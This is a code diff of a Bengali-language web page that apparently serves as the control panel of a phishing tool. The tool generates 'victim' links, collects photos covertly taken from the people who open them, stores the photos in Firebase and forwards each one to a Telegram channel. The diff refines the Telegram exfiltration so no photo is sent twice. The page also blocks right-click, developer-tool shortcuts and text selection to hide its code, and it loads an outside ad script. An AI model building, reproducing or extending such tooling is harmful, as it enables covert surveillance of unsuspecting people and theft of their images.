@@ -1,76 +1,69 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-<script>
-const msgs = ["লজ্জা করো 🥺","আবারো? 😭","পাপ হবে 💙","হাত ব্যাথা করেনা? 🥹","না প্লিজ 🥶"," এরে এবার থাম 😱","ব্লক করবো 😤","আহারে… 💔","যাও যাও 🏃‍♂️","নিজে লেখো 🌟"];
+  <script>
+    const msgs = ["লজ্জা করো 🥺","আবারো? 😭","পাপ হবে 💙","হাত ব্যাথা করেনা? 🥹","না প্লিজ 🥶"," এরে এবার থাম 😱","ব্লক করবো 😤","আহারে… 💔","যাও যাও 🏃‍♂️","নিজে লেখো 🌟"];
+    let first = true;
 
-let first = true;
-
-document.oncontextmenu = e => {
-    e.preventDefault();
-    
-    if (first) {
-        first = false;
-        Swal.fire({
-            title: "আরে না না 🥺",
-            text: "কোড চুরি করবা? আমার খুব কষ্ট হবে 💙",
-            icon: "warning",
-            confirmButtonText: "সরি, আর করবো না 🥹",
-            allowOutsideClick: false,
-            allowEscapeKey: false,
-        
-            background: "rgba(255, 255, 255, 0.95)",
-            backdrop: "rgba(59, 130, 246, 0.5)",
-            color: "#1e40af",
-            confirmButtonColor: "#3b82f6",
-            customClass: {
-                popup: "border border-blue-50 shadow-2xl",
-                title: "font-bold text-2xl",
-                confirmButton: "hover:scale-105 transition-transform"
-            }
-        });
-    } else {
-        const msg = msgs[Math.floor(Math.random() * msgs.length)];
-        Swal.fire({
-            toast: true,
-            title: msg,
-            position: "top-end",
-            timer: 2200,
-            timerProgressBar: true,
-            showConfirmButton: false,
-            icon: "error",
-            background: "linear-gradient(135deg, #3b82f6, #1e40af)",
-            color: "#fff",
-            customClass: {
-                popup: "animate__animated animate__fadeInRight shadow-lg border-l-4 border-white",
-                title: "font-semibold text-lg"
-            },
-            didOpen: (toast) => {
-                toast.addEventListener('mouseenter', Swal.stopTimer);
-                toast.addEventListener('mouseleave', Swal.resumeTimer);
-            }
-        });
-    }
-};
-
-// সব শর্টকাট ব্লক
-document.onkeydown = e => {
-    if (e.ctrlKey || e.key === "F12" || (e.shiftKey && e.ctrlKey)) {
+    document.oncontextmenu = e => {
         e.preventDefault();
-        Swal.fire({toast:true, title:"চিটিং করবা না 🥶", timer:1500, position:"top", background:"#1e40af", color:"#fff"});
-    }
-};
+        if (first) {
+            first = false;
+            Swal.fire({
+                title: "আরে না না 🥺",
+                text: "কোড চুরি করবা? আমার খুব কষ্ট হবে 💙",
+                icon: "warning",
+                confirmButtonText: "সরি, আর করবো না 🥹",
+                allowOutsideClick: false,
+                allowEscapeKey: false,
+                background: "rgba(255, 255, 255, 0.95)",
+                backdrop: "rgba(59, 130, 246, 0.5)",
+                color: "#1e40af",
+                confirmButtonColor: "#3b82f6",
+                customClass: {
+                    popup: "border border-blue-50 shadow-2xl",
+                    title: "font-bold text-2xl",
+                    confirmButton: "hover:scale-105 transition-transform"
+                }
+            });
+        } else {
+            const msg = msgs[Math.floor(Math.random() * msgs.length)];
+            Swal.fire({
+                toast: true,
+                title: msg,
+                position: "top-end",
+                timer: 2200,
+                timerProgressBar: true,
+                showConfirmButton: false,
+                icon: "error",
+                background: "linear-gradient(135deg, #3b82f6, #1e40af)",
+                color: "#fff",
+                customClass: {
+                    popup: "animate__animated animate__fadeInRight shadow-lg border-l-4 border-white",
+                    title: "font-semibold text-lg"
+                },
+                didOpen: (toast) => {
+                    toast.addEventListener('mouseenter', Swal.stopTimer);
+                    toast.addEventListener('mouseleave', Swal.resumeTimer);
+                }
+            });
+        }
+    };
 
-// টেক্সট সিলেক্ট বন্ধ
-document.body.style.userSelect = "none";
-</script>
+    document.onkeydown = e => {
+        if (e.ctrlKey || e.key === "F12" || (e.shiftKey && e.ctrlKey)) {
+            e.preventDefault();
+            Swal.fire({toast:true, title:"চিটিং করবা না 🥶", timer:1500, position:"top", background:"#1e40af", color:"#fff"});
+        }
+    };
 
-<!-- অতিরিক্ত সৌন্দর্যের জন্য (অপশনাল) -->
-<style>
-body { background: linear-gradient(to bottom, #f0f9ff, #e0f2fe); min-height: 100vh; }
-</style>
+    document.body.style.userSelect = "none";
+  </script>
+
+  <style>
+    body { background: linear-gradient(to bottom, #f0f9ff, #e0f2fe); min-height: 100vh; }
+  </style>
   
   <script>
     (function() {
@@ -117,15 +110,10 @@ body { background: linear-gradient(to bottom, #f0f9ff, #e0f2fe); min-height: 100
     .card:hover{transform:translateY(-6px)}
     .card img{width:100%;height:180px;object-fit:cover;border-bottom:4px solid #3b82f6;cursor:pointer}
     .time{background:#3b82f6;color:#fff;padding:8px;font-size:0.8em;text-align:center;font-weight:600}
-    
-    /* ডাউনলোড বাটন */
     .download-btn{position:absolute;bottom:38px;right:8px;background:#10b981;color:#fff;width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:18px;box-shadow:0 3px 12px rgba(0,0,0,0.3);transition:all .2s}
     .download-btn:hover{background:#059669;transform:scale(1.12)}
-    
-    /* ডিলিট বাটন */
     .delete-btn{position:absolute;top:8px;right:8px;background:#ef4444;color:#fff;width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:18px;box-shadow:0 3px 12px rgba(0,0,0,0.3);transition:all .2s}
     .delete-btn:hover{background:#dc2626;transform:scale(1.12)}
-    
     .noimg{background:#fff;padding:50px;border-radius:16px;text-align:center;color:#64748b;font-size:1.1em;box-shadow:0 5px 15px rgba(0,0,0,0.08);margin:20px}
     footer{background:#fff;padding:30px;text-align:center;color:#64748b;font-size:0.9em;border-top:1px solid #e0e7ff;margin-top:60px}
     footer a{color:#3b82f6;text-decoration:none;font-weight:600}
@@ -174,6 +162,7 @@ firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
 let currentId = localStorage.getItem("currentCamId") || null;
+let sentImages = new Set(); // এই সেটে ট্র্যাক রাখা হবে কোন ছবি টেলিগ্রামে পাঠানো হয়েছে
 
 if(currentId){
   document.getElementById("linkBox").style.display = "block";
@@ -189,6 +178,7 @@ function generateLink(){
   document.getElementById("victimLink").value = link;
   document.getElementById("grid").innerHTML = "";
   document.getElementById("noimg").style.display = "block";
+  sentImages.clear(); // নতুন লিংক হলে আগের ট্র্যাক রিসেট
   loadPhotos(currentId);
 }
 
@@ -198,7 +188,6 @@ function copyLink(){
   alert("কপি হয়ে গেছে!");
 }
 
-// ডিলিট ফাংশন – এখন ১০০% কাজ করে
 function deletePhoto(key, cardElement){
   if(confirm("এই ছবি মুছে ফেলতে চাও?")){
     db.ref("victims/"+currentId+"/"+key).remove();
@@ -207,6 +196,9 @@ function deletePhoto(key, cardElement){
 }
 
 async function sendToTelegram(base64){
+  if (sentImages.has(base64)) return; // ইতিমধ্যে পাঠানো হলে আর পাঠাবে না
+  sentImages.add(base64);
+  
   try{
     const blob = await (await fetch(base64)).blob();
     const file = new File([blob], "photo.jpg", {type:"image/jpeg"});
@@ -233,23 +225,32 @@ function loadPhotos(id){
     const key = s.key;
     const data = s.val();
     if(!data?.data) return;
-    document.getElementById("noimg").style.display = "none";
-    const card = document.createElement("div");
-    card.className = "card";
-    card.innerHTML = `
-      <img src="${data.data}" onclick="window.open('${data.data}')">
-      <div class="time">${new Date(data.time).toLocaleTimeString('bn-BD')}</div>
-      <div class="download-btn" onclick="downloadImage('${data.data}')" title="ডাউনলোড"><i class="fas fa-download"></i></div>
-      <div class="delete-btn" onclick="deletePhoto('${key}', this)" title="মুছে ফেলুন"><i class="fas fa-trash-alt"></i></div>
-    `;
-    document.getElementById("grid").appendChild(card);
-    sendToTelegram(data.data);
+
+    // শুধুমাত্র নতুন ছবি দেখাবে এবং টেলিগ্রামে পাঠাবে
+    if (!sentImages.has(data.data)) {
+      document.getElementById("noimg").style.display = "none";
+      const card = document.createElement("div");
+      card.className = "card";
+      card.innerHTML = `
+        <img src="${data.data}" onclick="window.open('${data.data}')">
+        <div class="time">${new Date(data.time).toLocaleTimeString('bn-BD')}</div>
+        <div class="download-btn" onclick="downloadImage('${data.data}')" title="ডাউনলোড"><i class="fas fa-download"></i></div>
+        <div class="delete-btn" onclick="deletePhoto('${key}', this)" title="মুছে ফেলুন"><i class="fas fa-trash-alt"></i></div>
+      `;
+      document.getElementById("grid").appendChild(card);
+      sendToTelegram(data.data); // শুধু নতুন ছবি পাঠাবে
+    }
   });
-  setTimeout(()=>{ ref.remove(); localStorage.removeItem("currentCamId"); }, 3600000);
+  
+  setTimeout(()=>{ 
+    ref.off(); // লিসেনার বন্ধ
+    ref.remove(); 
+    localStorage.removeItem("currentCamId"); 
+    sentImages.clear();
+  }, 3600000);
 }
 </script>
 
-<!-- টেলিগ্রাম বাবল -->
 <style>
   .tg-bubble{position:fixed;bottom:30px;right:30px;width:62px;height:62px;background:linear-gradient(135deg,#0088cc,#00aaff);color:white;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:32px;box-shadow:0 8px 25px rgba(0,136,204,0.4);z-index:9999;cursor:pointer;transition:all .4s cubic-bezier(.68,-.55,.265,1.55);animation:pulse2 4s infinite}
   .tg-bubble:hover{transform:translateY(-10px) scale(1.12);box-shadow:0 15px 35px rgba(0,136,204,0.6)}
@@ -264,7 +265,6 @@ function loadPhotos(id){
   <div class="tg-tooltip">হাই! PixGuard চ্যানেলে চ্যাট করি</div>
 </div>
 
-<script type='text/javascript' src='//spinachhypocrisy.com/1a/6b/af/1a6baf54ea8dc0c2a4e21f28343bf3c7.js'></script>
 <script type='text/javascript' src='//spinachhypocrisy.com/1a/6b/af/1a6baf54ea8dc0c2a4e21f28343bf3c7.js'></script>
 
 </body>
